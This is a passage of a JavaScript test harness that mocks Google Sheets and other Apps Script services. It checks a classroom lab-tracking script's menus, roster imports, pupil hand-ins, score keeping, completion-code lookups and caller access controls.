/* A fake Google Sheets, just real enough to run the script and catch what would throw.
   It does not check that the sheet LOOKS right — it checks that every call exists, every
   name resolves, and every range is in bounds. That is what has been breaking. */
const fs = require('fs');
const calls = [];
function log(m) { calls.push(m); }

class Range {
  constructor(sheet, r, c, nr, nc) {
    Object.assign(this, { sheet, r, c, nr: nr || 1, nc: nc || 1 });
    if (r < 1 || c < 1) throw new Error(`getRange out of bounds: row ${r} col ${c} on "${sheet.name}"`);
  }
  setValues(v) {
    if (!Array.isArray(v) || v.length !== this.nr) throw new Error(`setValues: expected ${this.nr} rows, got ${v && v.length} on "${this.sheet.name}"`);
    if (v[0].length !== this.nc) throw new Error(`setValues: expected ${this.nc} cols, got ${v[0].length} on "${this.sheet.name}" at r${this.r}c${this.c}`);
    for (let i = 0; i < this.nr; i++) for (let j = 0; j < this.nc; j++) this.sheet.put(this.r + i, this.c + j, v[i][j]);
    return this;
  }
  setValue(x) { for (let i = 0; i < this.nr; i++) for (let j = 0; j < this.nc; j++) this.sheet.put(this.r + i, this.c + j, x); return this; }
  clearContent() { for (let i = 0; i < this.nr; i++) for (let j = 0; j < this.nc; j++) this.sheet.put(this.r + i, this.c + j, ''); return this; }
  /* The grid-at-a-time setters. They are checked for shape exactly like setValues, because a
     wrong-sized grid is the whole reason to batch carefully rather than call in a loop. */
  _grid(name, v) {
    if (!Array.isArray(v) || v.length !== this.nr) throw new Error(`${name}: expected ${this.nr} rows, got ${v && v.length} on "${this.sheet.name}"`);
    for (const row of v) {
      if (!Array.isArray(row) || row.length !== this.nc) throw new Error(`${name}: expected ${this.nc} cols, got ${row && row.length} on "${this.sheet.name}" at r${this.r}c${this.c}`);
    }
    return this;
  }
  setBackgrounds(v) { return this._grid('setBackgrounds', v); }
  setNotes(v) {
    this._grid('setNotes', v);
    for (const row of v) for (const n of row) if (n != null && typeof n !== 'string') throw new Error('setNotes wants strings');
    return this;
  }
  setWraps(v) { return this._grid('setWraps', v); }
  /* the read-then-overlay-then-write pattern: the grid that comes back must be the range's own
     shape, so a mistake in the overlay is caught by _grid on the way back in */
  getNumberFormats() {
    return Array.from({ length: this.nr }, () => Array.from({ length: this.nc }, () => ''));
  }
  getHorizontalAlignments() {
    return Array.from({ length: this.nr }, () => Array.from({ length: this.nc }, () => 'general'));
  }
  setNumberFormats(v) { return this._grid('setNumberFormats', v); }
  setHorizontalAlignments(v) { return this._grid('setHorizontalAlignments', v); }
  setDataValidations(v) { return this._grid('setDataValidations', v); }
  getValues() {
    const out = [];
    for (let i = 0; i < this.nr; i++) { const row = []; for (let j = 0; j < this.nc; j++) row.push(this.sheet.get(this.r + i, this.c + j)); out.push(row); }
    return out;
  }
  getValue() { return this.sheet.get(this.r, this.c); }
  isBlank() { return this.getValues().every(r => r.every(v => v === '' || v == null)); }
  getRow() { return this.r; } getColumn() { return this.c; }
  getSheet() { return this.sheet; }
  setNote(t) { if (typeof t !== 'string') throw new Error('setNote wants a string'); return this; }
  setDataValidation() { return this; }
  insertCheckboxes() { return this; }
  createFilter() { if (this.sheet._filter) throw new Error(`two filters on "${this.sheet.name}"`); this.sheet._filter = true; return {}; }
  applyRowBanding() { this.sheet._bandings.push({});
    const b = { remove: () => {} };
    for (const m of ['setHeaderRowColor','setFirstRowColor','setSecondRowColor','setFooterRowColor']) b[m] = () => b;
    return b; }
  clearDataValidations() { return this; }
}
for (const m of ['setFontWeight','setFontColor','setBackground','setVerticalAlignment','setHorizontalAlignment',
                 'setWrap','setNumberFormat','setFontSize','setFontStyle','setBorder','clearFormat',
                 'setFontFamily','setHorizontalAlignments','merge','clear'])
  Range.prototype[m] = function () { return this; };

class Sheet {
  constructor(ss, name) { this.ss = ss; this.name = name; this.cells = new Map(); this.maxR = 1000; this.maxC = 26; this._bandings = []; this._filter = false; this._rules = []; }
  key(r, c) { return r + ':' + c; }
  put(r, c, v) {
    if (r > this.maxR || c > this.maxC) throw new Error(`write outside the sheet "${this.name}": r${r} c${c} (max ${this.maxR}x${this.maxC})`);
    this.cells.set(this.key(r, c), v);
  }
  get(r, c) { const v = this.cells.get(this.key(r, c)); return v === undefined ? '' : v; }
  getName() { return this.name; }
  setRowHeights(start, num, h) {
    if (start < 1 || num < 1) throw new Error(`setRowHeights out of bounds on "${this.name}": start ${start}, num ${num}`);
    if (start + num - 1 > this.maxR) throw new Error(`setRowHeights past the end of "${this.name}": rows ${start}..${start + num - 1} of ${this.maxR}`);
    return this;
  }
  getRange(a, b, c, d) { global.__CALLS++;
    if (typeof a === 'string') { const m = /^([A-Z]+)(\d+)(?::([A-Z]+)(\d+))?$/.exec(a); if (!m) throw new Error('bad A1: ' + a);
      const col = s => s.split('').reduce((n, ch) => n * 26 + ch.charCodeAt(0) - 64, 0);
      const r1 = +m[2], c1 = col(m[1]); const r2 = m[4] ? +m[4] : r1, c2 = m[3] ? col(m[3]) : c1;
      return new Range(this, r1, c1, r2 - r1 + 1, c2 - c1 + 1); }
    return new Range(this, a, b, c, d);
  }
  getDataRange() { return new Range(this, 1, 1, Math.max(1, this.getLastRow()), Math.max(1, this.getLastColumn())); }
  getIndex() { return this.ss.sheets.indexOf(this) + 1; }
  getLastRow() { let m = 0; for (const k of this.cells.keys()) m = Math.max(m, +k.split(':')[0]); return m; }
  getLastColumn() { let m = 0; for (const k of this.cells.keys()) m = Math.max(m, +k.split(':')[1]); return m; }
  getMaxRows() { return this.maxR; } getMaxColumns() { return this.maxC; }
  insertColumnsAfter(a, n) { this.maxC += n; return this; }
  insertRowsAfter(a, n) { this.maxR += n; return this; }
  /* Inserting a column shifts everything at or right of it one to the right, and the sheet
     grows by one — the same as the real thing. Cells are keyed "row:col", so move them from
     the right-hand end inwards or one would overwrite the next. Without this the column-repair
     path could not be tested at all. */
  insertColumnBefore(c) {
    const moves = [];
    for (const [k, v] of this.cells) {
      const [r, col] = k.split(':').map(Number);
      if (col >= c) moves.push([r, col, v]);
    }
    moves.sort((a, b) => b[1] - a[1]);
    for (const [r, col, v] of moves) { this.cells.delete(this.key(r, col)); this.cells.set(this.key(r, col + 1), v); }
    this.maxC += 1;
    return this;
  }
  /* Really removes the cells and slides everything to the right of them left, the way the real
     thing does. Only shrinking maxC would have let a repair "delete" a column while its data
     stayed exactly where it was, and the test would have passed on a lie. */
  deleteColumns(at, n) {
    if (at + n - 1 > this.maxC) throw new Error(`deleteColumns past the end on "${this.name}"`);
    const moves = [];
    for (const [k, v] of this.cells) {
      const [r, col] = k.split(':').map(Number);
      if (col >= at && col < at + n) this.cells.delete(k);
      else if (col >= at + n) moves.push([r, col, v]);
    }
    moves.sort((a, b) => a[1] - b[1]);
    for (const [r, col, v] of moves) { this.cells.delete(this.key(r, col)); this.cells.set(this.key(r, col - n), v); }
    this.maxC -= n;
    return this;
  }
  deleteColumn(c) { return this.deleteColumns(c, 1); }
  /* Really removes the cells and slides what is below them up, the same as deleteColumns.
     Only shrinking maxR let a "deleted" row keep its data exactly where it was. */
  deleteRows(at, n) {
    if (at + n - 1 > this.maxR) throw new Error(`deleteRows past the end on "${this.name}"`);
    const moves = [];
    for (const [k, v] of this.cells) {
      const [r, col] = k.split(':').map(Number);
      if (r >= at && r < at + n) this.cells.delete(k);
      else if (r >= at + n) moves.push([r, col, v]);
    }
    moves.sort((a, b) => a[0] - b[0]);
    for (const [r, col, v] of moves) { this.cells.delete(this.key(r, col)); this.cells.set(this.key(r - n, col), v); }
    this.maxR -= n;
    return this;
  }
  deleteRow(r) { return this.deleteRows(r, 1); }
  appendRow(v) { const r = this.getLastRow() + 1; if (r > this.maxR) this.maxR = r; v.forEach((x, i) => this.put(r, i + 1, x)); return this; }
  getBandings() { return this._bandings.map(() => ({ remove: () => {} })); }
  getFilter() { return this._filter ? { remove: () => { this._filter = false; } } : null; }
  setConditionalFormatRules(rs) { if (!Array.isArray(rs)) throw new Error('rules must be an array'); this._rules = rs; return this; }
  hideColumns(c, n) { if (c > this.maxC) throw new Error(`hideColumns past the end on "${this.name}"`); return this; }
  clear() { this.cells.clear(); return this; }
}
for (const m of ['setColumnWidth','setRowHeight','setFrozenRows','setFrozenColumns','setHiddenGridlines','activate','setTabColor'])
  Sheet.prototype[m] = function () { return this; };

class SS {
  constructor() { this.sheets = []; }
  getName() { return 'Test sheet'; }
  getId() { return 'FAKE_SHEET_ID'; }
  getSheetByName(n) { return this.sheets.find(s => s.name === n) || null; }
  getSheets() { return this.sheets.slice(); }
  getActiveSheet() { return this._active || this.sheets[0] || null; }
  setActiveSheet(sh) { this._active = sh; return sh; }
  /* Moves the active sheet to position pos (1-based), as the real thing does. */
  moveActiveSheet(pos) {
    const sh = this.getActiveSheet(); if (!sh) return;
    const at = this.sheets.indexOf(sh); if (at < 0) return;
    this.sheets.splice(at, 1);
    this.sheets.splice(Math.max(0, Math.min(pos - 1, this.sheets.length)), 0, sh);
  }
  insertSheet(n) { const s = new Sheet(this, n); this.sheets.push(s); return s; }
  deleteSheet(s) { this.sheets = this.sheets.filter(x => x !== s); }
  toast() {}
}
const ss = new SS();

global.SpreadsheetApp = {
  flush: () => {},
  openById: () => ss, getActive: () => ss, getActiveSpreadsheet: () => ss,
  getUi: () => ({ createMenu: () => { const m = { addItem: () => m, addSeparator: () => m, addToUi: () => {} }; return m; },
                  alert: (a, b) => log('alert: ' + String(b).slice(0, 60)), ButtonSet: { OK: 1 } }),
  newDataValidation: () => { const d = { requireValueInList: () => d, setAllowInvalid: () => d, setHelpText: () => d, build: () => ({}) }; return d; },
  newConditionalFormatRule: () => { const r = new Proxy({}, { get: (t, k) => k === 'build' ? () => ({}) : () => r }); return r; },
  BandingTheme: { LIGHT_GREY: 'grey' }, InterpolationType: { NUMBER: 'n' },
  BorderStyle: { SOLID: 'solid', SOLID_THICK: 'thick', DOTTED: 'dotted' }
};
const props = new Map();
global.PropertiesService = { getScriptProperties: () => ({ getProperty: k => props.get(k) || null, setProperty: (k, v) => props.set(k, v) }) };
/* A real cache, EXCEPT for verified tokens: those keys stay a miss so every hand-in
   re-verifies rather than passing on a cached yes. The import's progress does need to come
   back out again, or the dialog has nothing to read. */
const cacheStore = new Map();
const cacheWrites = [];                    /* every put, in order — the dialog's whole view */
global.CacheService = { getScriptCache: () => ({
  put: (k, v) => { if (!/^ID_/.test(k)) { cacheStore.set(k, v); cacheWrites.push([k, v]); } },
  get: (k) => (/^ID_/.test(k) ? null : (cacheStore.get(k) || null))
}) };
global.ContentService = { createTextOutput: t => ({ setMimeType: () => t }), MimeType: { TEXT: 1, JSON: 2, JAVASCRIPT: 3 } };
global.HtmlService = { createHtmlOutputFromFile: (name) => ({
  getContent: () => fs.readFileSync('apps-script/' + name + '.html', 'utf8'),
  setWidth: () => ({ setHeight: () => ({}) }) }) };
global.ScriptApp = { getProjectTriggers: () => [], newTrigger: () => ({ forSpreadsheet: () => ({ onEdit: () => ({ create: () => {} }) }) }) };
global.LockService = { getScriptLock: () => ({ waitLock: () => true, releaseLock: () => {} }) };
global.Logger = { log: m => log('log: ' + m) };
global.Classroom = undefined;                    /* as it is before the service is added */
global.TOKEN_EMAIL = 'ana@x.kr';
/* Every call to Google's token check is counted, so a test can prove junk never reaches it. */
global.FETCHES = 0;
global.TOKEN_ISS = 'https://accounts.google.com';
/* the published station manifest, when a test asks for one */
global.MANIFEST_JSON = '';
global.UrlFetchApp = { fetch: (url) => {
  if (MANIFEST_JSON && /stations\.json$/.test(String(url || ''))) {
    return { getResponseCode: () => 200, getContentText: () => MANIFEST_JSON };
  }
  return _tokenFetch(); } };
const _tokenFetch = () => { FETCHES++; return { getResponseCode: () => 200,
  getContentText: () => JSON.stringify({ aud: 'CID', iss: TOKEN_ISS, exp: Math.floor(Date.now()/1000)+3600,
                                         email_verified: 'true', email: TOKEN_EMAIL, name: 'A Person' }) }; };
global.Utilities = { base64EncodeWebSafe: b => 'b64' + String(b).length,
                     computeDigest: (a, t) => String(t), DigestAlgorithm: { SHA_256: 1 },
                     base64DecodeWebSafe: s => Buffer.from(String(s).replace(/-/g, '+').replace(/_/g, '/'), 'base64'),
                     newBlob: bytes => ({ getDataAsString: () => Buffer.from(bytes).toString('utf8') }) };
/* A sign-in shaped like Google's: three parts, the middle one naming this app and a time to come.
   The script turns away anything that is not, before it spends a call on it. */
global.jwt = (claims) => ['{"alg":"RS256"}', JSON.stringify(claims), 'sig']
  .map((x, i) => i === 2 ? x : Buffer.from(x).toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '')).join('.');
global.TOK = jwt({ aud: 'CID', exp: Math.floor(Date.now() / 1000) + 3600, email: 'ana@x.kr' });
global.__CALLS = 0;                 /* every crossing of the Sheets service boundary */
global.OWNER = 'teacher@x.kr';
global.VISITOR = '';
global.Session = { getEffectiveUser: () => ({ getEmail: () => OWNER }), getActiveUser: () => ({ getEmail: () => VISITOR }) };
global.HtmlService.createHtmlOutput = (h) => { const o = { html: h, setTitle: () => o, addMetaTag: () => o }; return o; };

eval(fs.readFileSync(process.argv[2] || 'apps-script/Code.gs', 'utf8'));

function run(label, fn) {
  try { fn(); console.log('  ok   ' + label); return true; }
  catch (e) { console.log('  FAIL ' + label + '  →  ' + e.message); return false; }
}
let ok = true;
/* Everything that reaches a function by NAME rather than by calling it: the menu items,
   and every google.script.run call in the dialog. Apps Script only finds out these are
   wrong when a human clicks — "Script function not found" — so they are checked here. */
console.log('— names reached by string —');
const SRC = fs.readFileSync(process.argv[2] || 'apps-script/Code.gs', 'utf8');
const HTML = fs.readFileSync('apps-script/ClassroomImport.html', 'utf8');
const defined = n => new RegExp('^function\\s+' + n + '\\s*\\(', 'm').test(SRC);

ok &= run('every menu item points at a function that exists', () => {
  const named = [...SRC.matchAll(/\.addItem\(\s*'(?:[^'\\]|\\.)*'\s*,\s*'([^']+)'/g)].map(m => m[1]);
  if (!named.length) throw new Error('no menu items found — has the menu moved?');
  const missing = named.filter(n => !defined(n));
  if (missing.length) throw new Error('the menu names nothing: ' + missing.join(', '));
});
ok &= run('every google.script.run call in the window exists', () => {
  if (!/google\.script\.run/.test(HTML)) throw new Error('the window calls nothing at all — has it been gutted?');
  /* the chain is written one call per line, so the server call is a line-leading .name( */
  const named = [...new Set([...HTML.matchAll(/^\s*\.\s*([A-Za-z_$][\w$]*)\s*\(/gm)].map(m => m[1]))]
    .filter(n => !['withSuccessHandler', 'withFailureHandler', 'withUserObject'].includes(n));
  if (!named.length) throw new Error('found no server calls to check');
  const missing = named.filter(n => !defined(n));
  if (missing.length) throw new Error('the window calls nothing named: ' + missing.join(', '));
});
ok &= run('every served page escapes the Apps Script sandbox iframe', () => {
  /* Apps Script serves a web-app page inside a sandbox iframe. A link without a target navigates
     INSIDE that frame, which tries to load script.google.com in a frame — Google refuses, and the
     teacher sees "refused to connect" instead of the next tab. <base target="_top"> is the fix. */
  ['Teacher'].forEach(n => {
    const h = fs.readFileSync('apps-script/' + n + '.html', 'utf8');
    if (!/<base\s+target=["']_top["']/.test(h)) throw new Error(n + '.html has no <base target="_top">');
  });
  if (!/<base target="_top">/.test(SRC)) throw new Error('the teacher page built in Code.gs has no <base target="_top">');
});
ok &= run('EVERY window file the script opens is really there', () => {
  /* was a non-global .match, so it only ever checked the first of the five */
  const want = [...new Set([...SRC.matchAll(/createHtmlOutputFromFile\('([^']+)'\)/g)].map(m => m[1]))];
  if (!want.length) throw new Error('nothing opens a window at all');
  const gone = want.filter(n => !fs.existsSync('apps-script/' + n + '.html'));
  if (gone.length) throw new Error('no such file: ' + gone.map(n => n + '.html').join(', '));
});
ok &= run('nothing reachable by google.script.run may read or write pupil data', () => {
  /* Apps Script treats only a TRAILING underscore as private. A leading one means nothing, so
     every function without a trailing underscore is callable by anyone who can load a page this
     script serves — and the public hand-in deployment serves pages to anonymous visitors. This
     allowlist is the gate: add a name here only if it is a real entry point AND it either needs
     no rights or checks the caller itself. */
  const ALLOWED = [
    'doGet', 'doPost', 'onOpen', 'onButtonTicked',              /* triggers and the web app */
    'setup', 'checkSetup', 'refreshDashboard',                  /* menu: rebuild/refresh this sheet only */
    'showClassroomImport', 'showTeacherPanel',                  /* menu: need a UI, throw in a web context */
    'getBatchImportData', 'executeBatchImportAll', 'getBatchImportProgress',  /* gated: _isAdminCaller_ */
    'teacherPanelData', 'teacherAddTeacher', 'teacherRemoveTeacher',          /* gated: _isAdminCaller_ */
    'teacherAddLink', 'teacherRemoveLink',
    'teacherSetPageUrl', 'teacherSetTrackerUrl', 'teacherSetHubUrl',
    'homeworkCreate', 'homeworkDelete', 'homeworkRefresh',                    /* gated: _hwCaller_ */
    'uiData'                                                                 /* gated: _hwCaller_ */
  ];
  const callable = [...new Set([...SRC.matchAll(/^function\s+([A-Za-z_$][\w$]*)\s*\(/gm)].map(m => m[1]))]
    .filter(n => !n.endsWith('_'));
  const extra = callable.filter(n => !ALLOWED.includes(n));
  if (extra.length) {
    throw new Error('reachable by anyone via google.script.run: ' + extra.join(', ') +
      '\n   Give each a trailing underscore, or gate it and add it to ALLOWED with the reason.');
  }
  /* and the three that must stay callable really do check the caller */
  ['getBatchImportData', 'executeBatchImportAll', 'getBatchImportProgress',
   'homeworkCreate', 'homeworkDelete', 'homeworkRefresh', 'uiData'].forEach(n => {
    const body = SRC.slice(SRC.indexOf('function ' + n + '('));
    if (!/_isAdminCaller_\(\)|_hwCaller_\(\)/.test(body.slice(0, 400))) {
      throw new Error(n + ' is callable but does not check the caller');
    }
  });
});

console.log('— with an empty spreadsheet —');
ok &= run('onOpen', () => onOpen());
ok &= run('setup / Tidy up', () => setup());
ok &= run('refreshDashboard', () => refreshDashboard());
ok &= run('checkSetup (Classroom off)', () => checkSetup());
ok &= run('doGet', () => doGet({}));
ok &= run('button: refresh', () => onButtonTicked({ range: ss.getSheetByName('Setup').getRange(BTN_ROW.refresh, 3) }));
ok &= run('button: tidy up', () => onButtonTicked({ range: ss.getSheetByName('Setup').getRange(BTN_ROW.restyle, 3) }));

console.log('— importing a class —');
ok &= run('import two students', () => _upsertStudents_(
  [{ name: 'Ana Lee', email: 'ana@x.kr', userId: 'u1' }, { name: 'Bo Kim', email: 'bo@x.kr', userId: 'u2' }], '9A', 'Y9 Biology', 'c1'));
ok &= run('every lab has a tab', () => {
  LABS.forEach(l => { if (!ss.getSheetByName(l.name)) throw new Error('no tab for ' + l.name); });
});
ok &= run('every student is waiting in every lab, with no marks', () => {
  LABS.forEach(l => {
    const sh = ss.getSheetByName(l.name);
    if (sh.getLastRow() !== 3) throw new Error(l.name + ' has ' + (sh.getLastRow() - 1) + ' rows, wanted 2');
    const v = sh.getRange(2, 1, 2, LAB_COLS.length).getValues();
    if (v[0][0] !== 'Ana Lee' || v[0][1] !== '9A') throw new Error(l.name + ': the name and class are not there');
    if (v[0][LAB_EMAIL - 1] !== 'ana@x.kr') throw new Error(l.name + ': no email to key on');
    if (v[0][2] !== '' || v[0][4] !== '') throw new Error(l.name + ': a mark appeared before anyone handed in');
  });
});
ok &= run('importing twice does not double anybody up', () => {
  _upsertStudents_([{ name: 'Ana Lee', email: 'ana@x.kr', userId: 'u1' }], '9A', 'Y9 Biology', 'c1');
  const sh = ss.getSheetByName('Digestion');
  if (sh.getLastRow() !== 3) throw new Error('now ' + (sh.getLastRow() - 1) + ' rows');
});

console.log('— handing in —');
CLIENT_ID = 'CID';
const hand = (o) => String(doPost({ postData: { contents: JSON.stringify(Object.assign({
  app: 'digestion-lab', name: 'Ana Lee', form: '9A', token: TOK, complete: true,
  from: new Date(Date.now() - 3 * 864e5).toISOString(), stations: { mouth: '8/8 in 11' } }, o)) } }));
/* However many questions the Digestion Lab actually asks. Hard-coding it meant every code
   test broke the day the real count was corrected, which looked like a bug in the script. */
const QN = LABS.filter(l => l.id === 'digestion-lab')[0].questions;

const anaRow = () => ss.getSheetByName('Digestion').getRange(2, 1, 1, LAB_COLS.length).getValues()[0];

ok &= run('a hand-in fills the row that was waiting', () => {
  const out = hand({ score: 90, total: QN, checks: 214, firstTime: 71, code: _code_('digestion-lab', 'Ana Lee', '9A', '90/' + QN) });
  if (!/^recorded/.test(out)) throw new Error(out);
  const sh = ss.getSheetByName('Digestion');
  if (sh.getLastRow() !== 3) throw new Error('a row was added instead of filled');
  const r = anaRow();
  if (r[2] !== 90 || r[3] !== QN) throw new Error('score not written: ' + r.slice(2, 5));
  if (Math.abs(r[4] - 90 / QN) > 1e-9) throw new Error('percentage wrong: ' + r[4]);
  if (r[5] !== 'complete') throw new Error('finished flag wrong: ' + r[5]);
  if (r[9] !== 1) throw new Error('hand-ins should read 1, reads ' + r[9]);
  if (!(r[10] instanceof Date)) throw new Error('no date on the hand-in');
});
ok &= run('nobody else was touched', () => {
  const bo = ss.getSheetByName('Digestion').getRange(3, 1, 1, LAB_COLS.length).getValues()[0];
  if (bo[0] !== 'Bo Kim' || bo[2] !== '') throw new Error('Bo Kim was written over');
});
ok &= run('a worse second go keeps the better score but still counts', () => {
  const was = anaRow()[10];
  const out = hand({ score: 40, total: QN, checks: 300, firstTime: 20, code: _code_('digestion-lab', 'Ana Lee', '9A', '40/' + QN) });
  const r = anaRow();
  if (r[2] !== 90) throw new Error('a worse run overwrote the best score: ' + r[2]);
  if (r[6] !== 214) throw new Error('the rest of the worse run leaked in');
  if (r[9] !== 2) throw new Error('hand-ins should read 2, reads ' + r[9]);
  if (!(r[10] >= was)) throw new Error('the date did not move');
  if (!/higher/.test(out)) throw new Error('should say an earlier one still scores higher: ' + out);
});
ok &= run('a better go replaces it', () => {
  hand({ score: QN, total: QN, checks: 118, firstTime: 99, code: _code_('digestion-lab', 'Ana Lee', '9A', QN + '/' + QN) });
  const r = anaRow();
  if (r[2] !== QN || r[6] !== 118 || r[7] !== 99) throw new Error('the better run was not kept: ' + r.slice(2, 8));
  if (r[9] !== 3) throw new Error('hand-ins should read 3, reads ' + r[9]);
});
ok &= run('handing in part-way through says so', () => {
  TOKEN_EMAIL = 'bo@x.kr';
  hand({ name: 'Bo Kim', score: 20, total: 40, complete: false, code: _code_('digestion-lab', 'Bo Kim', '9A', '20/40') });
  TOKEN_EMAIL = 'ana@x.kr';
  const bo = ss.getSheetByName('Digestion').getRange(3, 1, 1, LAB_COLS.length).getValues()[0];
  if (bo[5] !== 'progress') throw new Error('not marked as in progress: ' + bo[5]);
  if (!/NOT ALL QUESTIONS|PROGRESS/.test(bo[12])) throw new Error('no flag raised: ' + bo[12]);
});
ok &= run('a student who joined after the import gets a row', () => {
  _upsertStudents_([{ name: 'Chae Won', email: 'chae@x.kr', userId: 'u3' }], '9A', 'Y9 Biology', 'c1');
  TOKEN_EMAIL = 'chae@x.kr';
  hand({ name: 'Chae Won', score: 50, total: QN, code: _code_('digestion-lab', 'Chae Won', '9A', '50/' + QN) });
  TOKEN_EMAIL = 'ana@x.kr';
  const sh = ss.getSheetByName('Digestion');
  if (sh.getLastRow() !== 4) throw new Error('rows: ' + (sh.getLastRow() - 1));
  if (sh.getRange(4, 1).getValue() !== 'Chae Won') throw new Error('not the new student');
});

console.log('— who is turned away —');
ok &= run('somebody not on the roster leaves no trace', () => {
  TOKEN_EMAIL = 'stranger@elsewhere.com';
  const before = ss.getSheetByName('Digestion').getLastRow();
  const rejBefore = ss.getSheetByName('Rejected') ? ss.getSheetByName('Rejected').getLastRow() : 0;
  const out = hand({ name: 'A Stranger', score: QN, total: QN, code: _code_('digestion-lab', 'A Stranger', '9A', QN + '/' + QN) });
  TOKEN_EMAIL = 'ana@x.kr';
  if (!/not on this class list/.test(out)) throw new Error('should have been turned away: ' + out);
  if (ss.getSheetByName('Digestion').getLastRow() !== before) throw new Error('a stranger was recorded');
  const rej = ss.getSheetByName('Rejected');
  if (rej && rej.getLastRow() !== rejBefore) throw new Error('a stranger left a trace in Rejected');
  const all = ss.getSheetByName('Digestion').getRange(1, 1, before, LAB_COLS.length).getValues();
  if (JSON.stringify(all).indexOf('stranger') >= 0) throw new Error('the stranger is written somewhere');
});
ok &= run('an unsigned hand-in leaves no trace', () => {
  const before = ss.getSheetByName('Digestion').getLastRow();
  const out = String(doPost({ postData: { contents: JSON.stringify({ app: 'digestion-lab', name: 'X', score: 1, total: QN }) } }));
  if (!/not signed in/.test(out)) throw new Error(out);
  if (ss.getSheetByName('Digestion').getLastRow() !== before) throw new Error('recorded anyway');
});
ok &= run('a student with a broken code is quarantined, not marked', () => {
  const rej = ss.getSheetByName('Rejected') ? ss.getSheetByName('Rejected').getLastRow() : 0;
  const best = anaRow()[2];
  hand({ score: 999, total: QN, code: 'DL-XX-YY' });
  if (ss.getSheetByName('Rejected').getLastRow() <= rej) throw new Error('not quarantined');
  if (anaRow()[2] !== best) throw new Error('a rejected hand-in still changed the mark');
});
ok &= run('a hand-in for a lab that does not exist is ignored', () => {
  const out = String(doPost({ postData: { contents: JSON.stringify({ app: 'not-a-lab', score: 1, total: 1, token: TOK }) } }));
  if (!/unknown lab/.test(out)) throw new Error(out);
});

console.log('— reading a completion code —');
const setupSheet = () => ss.getSheetByName('Setup');
const askAbout = (code) => {
  setupSheet().getRange(CODE_ROW, 2).setValue(code);
  checkCode_();
  return String(setupSheet().getRange(CODE_ROW + 1, 2).getValue());
};
ok &= run("a student's own code resolves to their name and score", () => {
  const answer = askAbout(_code_('digestion-lab', 'Ana Lee', '', QN + '/' + QN));
  if (!/Ana Lee/.test(answer)) throw new Error('did not name her: ' + answer);
  if (!new RegExp(QN + '\\/' + QN).test(answer)) throw new Error('did not give the score: ' + answer);
  if (!/finished/.test(answer)) throw new Error('did not say it was complete: ' + answer);
});
ok &= run('a part-way code resolves too, and says so', () => {
  const answer = askAbout(_code_('digestion-lab', 'Bo Kim', '9A', '20/' + QN));
  if (!/Bo Kim/.test(answer) || !new RegExp('20\\/' + QN).test(answer)) throw new Error(answer);
  if (!/part way/.test(answer)) throw new Error('should say part way: ' + answer);
});
ok &= run('it says whether the hand-in actually arrived', () => {
  const answer = askAbout(_code_('digestion-lab', 'Ana Lee', '', QN + '/' + QN));
  if (!/Already in the Digestion tab/.test(answer)) throw new Error(answer);
});
ok &= run("a stranger's code cannot be read, and it says why", () => {
  const answer = askAbout(_code_('digestion-lab', 'Someone In Peru', '', QN + '/' + QN));
  if (!/Could not read that code/.test(answer)) throw new Error(answer);
});
ok &= run('an invented code is refused', () => {
  if (!/Could not read that code/.test(askAbout('DL-AAAA-AAAA'))) throw new Error('accepted a made-up code');
});
ok &= run('nonsense in the cell asks for a code rather than failing', () => {
  if (!/Paste a completion code/.test(askAbout('hello'))) throw new Error('should have asked for a code');
});
ok &= run('a code already in a lab tab is looked up, not guessed at', () => {
  /* the exact case Daniel hit: the Students tab says "Daniel", Google said "Daniel Mompel
     Riera", so the code can never be reconstructed from the roster name — but it is sitting
     in the Code column of his row, and that is where it is found. */
  const sh = ss.getSheetByName('Digestion');
  const code = _code_('digestion-lab', 'Ana Lee Full Name From Google', '', QN + '/' + QN);
  sh.getRange(2, 12).setValue(code);
  const answer = askAbout(code);
  if (!/Ana Lee/.test(answer)) throw new Error('did not find the row it is written on: ' + answer);
  if (!/Already in the Digestion tab, row 2/.test(answer)) throw new Error(answer);
});
ok &= run('a Google name seen on a hand-in is remembered and tried', () => {
  const sh = ss.getSheetByName('Digestion');
  sh.getRange(3, LAB_GNAME).setValue('Bo Kim As Google Spells It');
  sh.getRange(3, 12).setValue('');                       /* so it cannot just be looked up */
  const answer = askAbout(_code_('digestion-lab', 'Bo Kim As Google Spells It', '', '77/' + QN));
  if (!/Bo Kim As Google Spells It/.test(answer)) throw new Error(answer);
  if (!new RegExp('77\\/' + QN).test(answer)) throw new Error(answer);
});
ok &= run('clearing the code clears the answer under it', () => {
  const sh = setupSheet();
  askAbout(_code_('digestion-lab', 'Ana Lee', '', QN + '/' + QN));
  if (!String(sh.getRange(CODE_ROW + 1, 2).getValue())) throw new Error('no answer to clear');
  sh.getRange(CODE_ROW, 2).setValue('');                       /* he deletes the code */
  onButtonTicked({ range: sh.getRange(CODE_ROW, 2) });
  const left = String(sh.getRange(CODE_ROW + 1, 2).getValue());
  if (left) throw new Error('the old answer is still sitting there: ' + left);
});
ok &= run('typing a new code replaces the old answer with a prompt', () => {
  const sh = setupSheet();
  askAbout(_code_('digestion-lab', 'Ana Lee', '', QN + '/' + QN));
  sh.getRange(CODE_ROW, 2).setValue('DL-ZZZZ-ZZZZ');
  onButtonTicked({ range: sh.getRange(CODE_ROW, 2) });
  const now = String(sh.getRange(CODE_ROW + 1, 2).getValue());
  if (/Ana Lee/.test(now)) throw new Error('still showing the answer to the previous code');
  if (!/Tick the box/.test(now)) throw new Error('no prompt to check it: ' + now);
});
ok &= run('editing anything else on Setup is left alone', () => {
  const sh = setupSheet();
  askAbout(_code_('digestion-lab', 'Ana Lee', '', QN + '/' + QN));
  const before = String(sh.getRange(CODE_ROW + 1, 2).getValue());
  onButtonTicked({ range: sh.getRange(URL_ROW, 2) });          /* he edits the web app URL */
  if (String(sh.getRange(CODE_ROW + 1, 2).getValue()) !== before) throw new Error('an unrelated edit wiped it');
});
ok &= run('the code button is wired to something that exists', () => {
  onButtonTicked({ range: setupSheet().getRange(BTN_ROW.code, 3) });
});
ok &= run('every button leaves a message that stays on the sheet', () => {
  Object.keys(BTN_ROW).forEach(k => {
    const row = BTN_ROW[k];
    const box = setupSheet().getRange(row, 3);
    box.setValue(true);
    onButtonTicked({ range: box });
    if (box.getValue() !== false) throw new Error(k + ': the box did not untick itself');
    const said = String(setupSheet().getRange(row, 4).getValue());
    if (!/^[✅❌]/.test(said)) throw new Error(k + ' said nothing afterwards: "' + said + '"');
    if (/^❌/.test(said)) throw new Error(k + ' failed: ' + said);
  });
});
ok &= run('a button that throws says so instead of going quiet', () => {
  const real = refreshDashboard;
  refreshDashboard = () => { throw new Error('pretend failure'); };
